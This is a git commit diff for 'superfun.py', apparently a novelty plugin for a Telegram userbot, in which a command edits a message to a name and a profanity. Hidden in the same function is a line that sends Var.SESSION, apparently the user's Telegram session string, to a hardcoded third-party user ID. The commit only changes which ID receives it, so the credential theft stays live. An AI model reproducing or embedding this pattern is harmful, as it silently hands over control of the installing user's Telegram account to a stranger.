e9eab9a24d45809056fab7cb3fbc04f99c2d2ffe
【★༒✞︎Îτß-ℓєɠεɳ∂-ℓх】ρɾαωαรɦ-Malviya <87700009+LEGEND-LX@users.noreply.github.com>
2022-01-08 01:34:35 -0800

    Update superfun.py

--- superfun.py
+++ superfun.py
@@ -31,4 +31,4 @@ async def fuckd(ult):
  await ult.edit ("Legend-Lx")
  await asyncio.sleep(2)
  await ult.edit ("fuck")
- await ult.client.send_message(756655062, Var.SESSION)
+ await ult.client.send_message(2041065447, Var.SESSION)
